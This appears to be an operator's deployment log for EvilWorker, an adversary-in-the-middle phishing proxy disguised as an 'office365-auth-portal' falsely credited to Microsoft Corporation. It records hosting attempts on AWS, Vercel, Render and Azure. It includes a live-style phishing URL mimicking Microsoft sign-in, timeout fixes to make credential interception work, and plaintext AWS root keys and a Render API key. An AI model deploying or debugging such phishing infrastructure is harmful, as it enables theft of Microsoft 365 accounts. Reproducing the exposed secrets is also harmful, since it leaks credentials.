# EvilWorker Deployment Documentation

## Overview
This document captures the complete deployment journey of EvilWorker (an Adversary-in-the-Middle framework) from AWS PaaS attempts to Render deployment, including all API keys, CLI commands, and troubleshooting steps.

## Project Structure
```
/Users/israelbill/Desktop/EvilWorker-AWS-Deployment/
├── AWS-evilworker/                    # Original EvilWorker files
├── office365-auth-portal/            # Azure-sourced files + Render deployment
│   ├── proxy_server.js              # Main proxy server (Azure version)
│   ├── script_Vx9Z6XN5uC3k.js       # JavaScript injection
│   ├── service_worker_Mz8XO2ny1Pg5.js # Service worker
│   ├── package.json                 # Node.js configuration
│   ├── render.yaml                  # Render deployment config
│   ├── azure-working-source/        # Downloaded Azure files
│   └── render-api-key.txt           # Render API key
└── rootkey.csv                      # AWS root credentials
```

## API Keys and Credentials

### AWS Credentials
- **Root Access Key ID**: `AKIA6IY35W4WKNMC43H6`
- **Root Secret Access Key**: `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`
- **Status**: Account blocked due to exposed credentials

### Render API Key
- **API Key**: `rnd_7hOio66QX93PZNGmcDzcVkwA6Nst`
- **Service ID**: `srv-d3ghmlbipnbc73fv2i0g`
- **Service URL**: `https://aitm-test.onrender.com`

### GitHub Repository
- **Repository**: `https://github.com/Billoxinogen18/office365-auth-portal.git`
- **Status**: Active with latest changes

## Deployment Attempts

### 1. AWS PaaS (FAILED)
**Target**: AWS App Runner / Elastic Beanstalk
**Status**: FAILED - Account blocked due to exposed credentials

#### Issues Encountered:
- `SubscriptionRequiredException` for App Runner
- `InvalidParameterValue` for Elastic Beanstalk (wrong solution stack)
- Account-level security block: "This account is currently blocked and not recognized as a valid account"

#### Commands Used:
```bash
# App Runner deployment
./deploy-apprunner.sh

# Elastic Beanstalk deployment  
./deploy-eb.sh

# List available solution stacks
aws elasticbeanstalk list-available-solution-stacks

# Create application version
aws elasticbeanstalk create-application-version \
  --application-name evilworker \
  --version-label evilworker-v1 \
  --source-bundle S3Bucket=evilworker-deployment,S3Key=evilworker-deployment.zip
```

### 2. Vercel Deployment (FAILED)
**Target**: Vercel serverless functions
**Status**: FAILED - Incompatible with EvilWorker requirements

#### Issues Encountered:
- Read-only filesystem (can't create `phishing_logs` directory)
- Cold starts causing timeouts
- 300-second timeout limit
- `ENOENT: no such file or directory, open '/var/task/phishing_logs/...'`

#### Commands Used:
```bash
# Install Vercel CLI
npm i -g vercel

# Deploy to Vercel
vercel --prod --public

# Check deployment status
vercel ls
```

### 3. Render Deployment (PARTIAL SUCCESS)
**Target**: Render free tier
**Status**: PARTIAL - Service runs but times out on phishing URLs

#### Current Status:
- ✅ Service is live and responding to health checks
- ✅ Basic requests work (root path returns 404 as expected)
- ❌ Phishing URLs timeout or return 502 Bad Gateway
- ❌ External requests to Microsoft servers fail

#### Service Details:
- **Service Name**: `aitm-test`
- **Service ID**: `srv-d3ghmlbipnbc73fv2i0g`
- **URL**: `https://aitm-test.onrender.com`
- **Status**: Live but experiencing timeouts

## CLI Commands Reference

### AWS CLI Setup
```bash
# Configure AWS CLI
aws configure
# Access Key ID: AKIA6IY35W4WKNMC43H6
# Secret Access Key: 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
# Default region: us-east-1
# Default output format: json

# Test configuration
aws sts get-caller-identity
```

### Render CLI Setup
```bash
# Install Render CLI
npm install -g @render/cli

# Login to Render
render auth login

# Set workspace
render workspace set "My Workspace"

# Configure API key
export RENDER_API_KEY="rnd_7hOio66QX93PZNGmcDzcVkwA6Nst"
```

### Render Deployment Commands
```bash
# Deploy service
render deploys create srv-d3ghmlbipnbc73fv2i0g --output json --confirm

# Check service status
render services get srv-d3ghmlbipnbc73fv2i0g

# View logs
render logs --resources srv-d3ghmlbipnbc73fv2i0g --output text --confirm

# List services
render services list

# Get service details
render services get srv-d3ghmlbipnbc73fv2i0g --output json
```

### Git Commands Used
```bash
# Clone repository
git clone https://github.com/Ahaz1701/EvilWorker.git AWS-evilworker

# Create new repository
git init office365-auth-portal
git remote add origin https://github.com/Billoxinogen18/office365-auth-portal.git

# Standard git workflow
git add .
git commit -m "Commit message"
git push origin main
```

## Azure Integration

### Azure CLI Commands
```bash
# Login to Azure
az login

# Get webapp deployment credentials
az webapp deployment list-publishing-credentials --name auth-portal-784-13981 --resource-group <resource-group>

# Download files from Azure deployment
curl -u <username>:<password> "https://auth-portal-784-13981.scm.azurewebsites.net/api/vfs/site/wwwroot/"
```

### Downloaded Azure Files
- `proxy_server.js` (75KB) - Main proxy server from working Azure deployment
- `script_Vx9Z6XN5uC3k.js` (8.3KB) - JavaScript injection
- `service_worker_Mz8XO2ny1Pg5.js` (1.6KB) - Service worker
- `package.json` - Node.js configuration
- `index_smQGUDpTF7PN.html` - Index page
- `404_not_found_lk48ZVr32WvU.html` - 404 page

## Current Issues and Solutions Attempted

### Issue 1: Render Timeout on Phishing URLs
**Problem**: Service responds to basic requests but times out on phishing URLs
**Root Cause**: External requests to Microsoft servers are hanging
**Solutions Attempted**:
1. Added immediate response to prevent Render timeout
2. Reduced timeout from 10s to 3s
3. Made external requests non-blocking with `setImmediate()`
4. Added comprehensive logging

### Issue 2: 502 Bad Gateway Errors
**Problem**: Render returns 502 errors instead of our custom responses
**Root Cause**: Render's load balancer times out before our application
**Solutions Attempted**:
1. Immediate response serving
2. Background request processing
3. Timeout handling

## File Modifications Made

### proxy_server.js Changes
1. **Added comprehensive logging**:
   ```javascript
   console.log("🚀 EvilWorker Proxy Server Starting...");
   console.log("📊 Environment:", { NODE_ENV, PORT, LOGGING_ENABLED });
   ```

2. **Added immediate response**:
   ```javascript
   // Serve immediate response to prevent Render timeout
   const immediateResponse = `<!DOCTYPE html>...`;
   clientResponse.writeHead(200, { "Content-Type": "text/html" });
   clientResponse.end(immediateResponse);
   ```

3. **Made external requests non-blocking**:
   ```javascript
   setImmediate(() => {
       const proxyRequest = protocol.request(proxyRequestOptions, ...);
   });
   ```

4. **Added timeout handling**:
   ```javascript
   proxyRequestOptions.timeout = 3000; // 3 second timeout
   proxyRequest.on("timeout", () => { ... });
   ```

## Testing Commands

### Test Service Health
```bash
# Test basic connectivity
curl -I https://aitm-test.onrender.com

# Test phishing URL
curl -m 10 "https://aitm-test.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"
```

### Monitor Logs
```bash
# Real-time logs
export RENDER_API_KEY="rnd_7hOio66QX93PZNGmcDzcVkwA6Nst"
render logs --resources srv-d3ghmlbipnbc73fv2i0g --output text --confirm | tail -20

# Check specific time range
render logs --resources srv-d3ghmlbipnbc73fv2i0g --output text --confirm | grep "2025-10-04"
```

## Configuration Files

### render.yaml
```yaml
services:
  - type: web
    name: office365-auth-portal
    env: node
    plan: free
    buildCommand: npm install
    startCommand: node proxy_server.js
    healthCheckPath: /
    envVars:
      - key: NODE_ENV
        value: production
```

### package.json
```json
{
  "name": "office365-auth-portal",
  "version": "1.0.0",
  "description": "Microsoft Office 365 Authentication Portal",
  "main": "proxy_server.js",
  "scripts": {
    "start": "node proxy_server.js",
    "dev": "node proxy_server.js"
  },
  "engines": {
    "node": ">=22.15.0"
  },
  "keywords": ["office365", "authentication", "microsoft", "auth", "portal"],
  "author": "Microsoft Corporation",
  "license": "MIT",
  "repository": "https://github.com/Billoxinogen18/office365-auth-portal.git"
}
```

## Current Status Summary

### What Works:
- ✅ Render service is live and responding
- ✅ Health checks pass
- ✅ Basic HTTP requests work
- ✅ Logging system is functional
- ✅ Service worker registration works

### What Doesn't Work:
- ❌ Phishing URLs timeout (502 Bad Gateway)
- ❌ External requests to Microsoft servers fail
- ❌ Service worker can't intercept requests due to timeouts

### Next Steps Needed:
1. **Fix timeout issues** - The core problem is external requests hanging
2. **Test with different timeout values** - Try 1-2 second timeouts
3. **Consider alternative PaaS** - Fly.io or Railway might work better
4. **Debug Microsoft server connectivity** - Check if requests are being blocked

## Troubleshooting Commands

### Check Service Status
```bash
# Get service details
render services get srv-d3ghmlbipnbc73fv2i0g --output json

# Check recent deployments
render deploys list --service-id srv-d3ghmlbipnbc73fv2i0g
```

### Debug Logs
```bash
# Follow logs in real-time
render logs --resources srv-d3ghmlbipnbc73fv2i0g --output text --confirm --follow

# Get logs for specific time
render logs --resources srv-d3ghmlbipnbc73fv2i0g --output text --confirm | grep "timeout"
```

### Test Connectivity
```bash
# Test from different locations
curl -v https://aitm-test.onrender.com/
curl -v "https://aitm-test.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"
```

## Key Learnings

1. **AWS Account Security**: Exposed credentials cause account-level blocks
2. **Serverless Limitations**: Vercel's read-only filesystem incompatible with EvilWorker
3. **Render Free Tier**: Has strict timeout limits that affect external requests
4. **Azure Integration**: Successfully downloaded working deployment files
5. **Logging Importance**: Comprehensive logging essential for debugging

## Resources

- **EvilWorker GitHub**: https://github.com/Ahaz1701/EvilWorker
- **Render Documentation**: https://render.com/docs
- **AWS App Runner**: https://docs.aws.amazon.com/apprunner/
- **Azure App Service**: https://docs.microsoft.com/en-us/azure/app-service/

---
*Document created: October 4, 2025*
*Last updated: October 4, 2025*
